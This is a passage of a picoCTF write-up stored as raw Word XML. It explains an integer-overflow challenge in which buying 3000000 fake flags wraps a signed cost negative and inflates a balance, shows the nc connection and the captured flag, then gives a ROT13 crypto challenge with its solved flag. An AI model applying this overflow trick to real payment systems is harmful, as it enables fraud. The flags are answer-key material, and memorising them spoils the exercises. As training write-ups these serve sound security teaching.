    <w:p w14:paraId="3F8C058C" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve">    </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t>fflush</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t>(stdin);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79BDB475" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve">    </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t>scanf</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t>("%d", &amp;</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t>number_flags</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t>);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DC0DC38" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve">    if(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t>number_flags</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve"> &gt; 0){</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6ACD49F3" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve">        int </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t>total_cost</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve"> = 0;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="609AE7FC" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve">        </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t>total_cost</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve"> = 900*</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t>number_flags</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t>;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31C2A05D"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nThe</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve"> final cost is: %d\n", </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t>total_cost</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t>);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="128EE641" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve">        if(</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t>total_cost</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve"> &lt;= </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t>account_balance</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t>){</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F24169F" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve">            </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t>account_balance</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve"> = </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t>account_balance</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve"> - </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t>total_cost</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t>;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76847E6A"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w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t>nYour</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve"> current balance after transaction: %d\n\n", </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t>account_balance</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t>);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53F2B29A" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve">        }</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20BA8ECC" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve">        else{</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3004DB36" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve">            </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t>printf</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t>("Not enough funds to complete purchase\n");</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="455A7BD0" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve">        }</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B4CA232" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t xml:space="preserve">    }</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05F72485" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="PreformattedText"/>
        <w:spacing w:after="283"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7540B950" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">We see that every fake flag costs </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t>900</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> dollars and it subtracts the total cost from our account balance. But what if </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t>total_cost</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> is negative? Then we add </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t>total_cost</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> to our balance, and if </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t>total_cost</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> is negative enough, then we can get a huge account balance. How do we get a negative </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t>total_cost</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F121857" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Notice that </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t>total_cost</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> is declared as an </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t>int</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. This is specifically a </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="Emphasis"/>
        </w:rPr>
        <w:t>Signed Integer</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, which has a range between </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t>-2,147,483,648</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t>2,147,483,647</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. Signed integers use the first bit to store whether it is negative or positive, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t>0</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> indicating positive and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t>1</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> indicating negative. What happens if you add </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t>1</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t>2,147,483,647</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and store the result in a signed integer? Well the first bit goes from </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t>0</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t>1</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, meaning that the number is now negative! In fact, due to the way </w:t>
      </w:r>
      <w:hyperlink r:id="rId43">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="InternetLink"/>
          </w:rPr>
          <w:t>Two's Complement</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve">, the method used to represent negative numbers in binary, works, it actually wraps around to the most negative integer: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t>-2,147,483,648</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="043C9933" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">This is what is known as an </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>Integer Overflow</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. We can use this to overflow the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t>total_cost</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> variable and increase our account balance. We need a </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t>total_cost</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> that is a large negative number, but not too large that it also overflows our </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t>account_balance</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="SourceText"/>
        </w:rPr>
        <w:t>3000000</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> works nicely as the number of fake flags to buy:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23CDF9F8" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2FFB5AAA" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="58D1EEBE" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>caro@ubuntu</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve">:~/Downloads$ </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>nc</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> jupiter.challenges.picoctf.org 4906</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08C0D7B4" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:anchor distT="0" distB="0" distL="0" distR="0" simplePos="0" relativeHeight="4" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="50A6F926" wp14:editId="30B10CDC">
            <wp:simplePos x="0" y="0"/>
            <wp:positionH relativeFrom="column">
              <wp:posOffset>222885</wp:posOffset>
            </wp:positionH>
            <wp:positionV relativeFrom="paragraph">
              <wp:posOffset>-600710</wp:posOffset>
            </wp:positionV>
            <wp:extent cx="5886450" cy="37909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44"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5886450" cy="3790950"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:anchor>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="691FBE59" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">YOUR FLAG IS: </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>picoCTF</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>{m0n3y_bag5_9c5fac9b}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01D651C0" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="160AD811" w14:textId="77777777" w:rsidR="00590591" w:rsidRDefault="00590591">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="390FC930" w14:textId="77777777" w:rsidR="00590591" w:rsidRPr="00C36E31" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C36E31">
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>1_wanna_b3_a_r0ck5tar</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DA60C15" w14:textId="77777777" w:rsidR="00590591" w:rsidRPr="00C36E31" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C36E31">
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>| 350 points</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="562A4CB5" w14:textId="77777777" w:rsidR="00590591" w:rsidRPr="00C36E31" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C36E31">
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>Tags: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FCD95BE" w14:textId="77777777" w:rsidR="00590591" w:rsidRPr="00C36E31" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C36E31">
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t xml:space="preserve">Author: Alex </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C36E31">
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>Bushkin</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="7CF679A1" w14:textId="77777777" w:rsidR="00590591" w:rsidRPr="00C36E31" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C36E31">
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>Description</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16A50D00" w14:textId="7FCC70FE" w:rsidR="00590591" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r w:rsidRPr="00C36E31">
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t xml:space="preserve">I wrote you another </w:t>
      </w:r>
      <w:hyperlink r:id="rId45" w:tgtFrame="_blank">
        <w:r w:rsidRPr="00C36E31">
          <w:rPr>
            <w:rStyle w:val="InternetLink"/>
            <w:highlight w:val="yellow"/>
          </w:rPr>
          <w:t>song</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00C36E31">
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t xml:space="preserve">. Put the flag in the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C36E31">
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>picoCTF</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C36E31">
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>{} flag format</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6117B708" w14:textId="3B716337" w:rsidR="00C36E31" w:rsidRDefault="00C36E31">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="07F80083" w14:textId="503858A9" w:rsidR="00C36E31" w:rsidRDefault="00C36E31">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1CAE38A4" w14:textId="4953FA4A" w:rsidR="00C36E31" w:rsidRPr="00C36E31" w:rsidRDefault="00C36E31">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
        <w:rPr>
          <w:sz w:val="44"/>
          <w:szCs w:val="44"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C36E31">
        <w:rPr>
          <w:sz w:val="44"/>
          <w:szCs w:val="44"/>
        </w:rPr>
        <w:t>Cryptography</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DCFE967" w14:textId="77777777" w:rsidR="00C36E31" w:rsidRDefault="00C36E31" w:rsidP="00C36E31">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>Mod 26</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C3A0D22" w14:textId="77777777" w:rsidR="00C36E31" w:rsidRDefault="00C36E31" w:rsidP="00C36E31">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>| 10 points</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A16765E" w14:textId="77777777" w:rsidR="00C36E31" w:rsidRDefault="00C36E31" w:rsidP="00C36E31">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Tags: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3AC7C3A6" w14:textId="77777777" w:rsidR="00C36E31" w:rsidRDefault="00C36E31" w:rsidP="00C36E31">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1CA9866E" w14:textId="77777777" w:rsidR="00C36E31" w:rsidRDefault="00C36E31" w:rsidP="00C36E31">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t>Author: Pandu</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E96FC9C" w14:textId="77777777" w:rsidR="00C36E31" w:rsidRDefault="00C36E31" w:rsidP="00C36E31">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Description</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7165AD8F" w14:textId="77777777" w:rsidR="00C36E31" w:rsidRDefault="00C36E31" w:rsidP="00C36E31">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="50F5804F" w14:textId="1F1EE4FC" w:rsidR="00C36E31" w:rsidRDefault="00C36E31" w:rsidP="00C36E31">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Cryptography can be easy, do you know what ROT13 is? </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>cvpbPGS</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t>{arkg_gvzr_V'yy_gel_2_ebhaqf_bs_ebg13_MAZyqFQj}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F43688A" w14:textId="26AA5CF2" w:rsidR="00C36E31" w:rsidRDefault="00C36E31" w:rsidP="00C36E31">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:r w:rsidRPr="00C36E31">
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>ROT13 ("rotate by 13 places",</w:t>
      </w:r>
      <w:r w:rsidRPr="00C36E31">
        <w:t xml:space="preserve"> sometimes hyphenated ROT-13) is a simple letter substitution cipher that replaces a letter with the 13th letter after it in the alphabet. ROT13 is a special case of the Caesar cipher which was developed in ancient Rome.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70BC7C30" w14:textId="09F53A32" w:rsidR="00C36E31" w:rsidRDefault="00C36E31" w:rsidP="00C36E31">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1FC65447" w14:textId="263E3AD2" w:rsidR="00C36E31" w:rsidRDefault="00C36E31" w:rsidP="00C36E31">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00C36E31">
        <w:t>picoCTF</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00C36E31">
        <w:t>{next_time_I'll_try_2_rounds_of_rot13_ZNMldSDw}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C6347A8" w14:textId="47C0C8CE" w:rsidR="00C36E31" w:rsidRDefault="00C36E31" w:rsidP="00C36E31">
      <w:pPr>
        <w:pStyle w:val="BodyText"/>
      </w:pPr>
    </w:p>
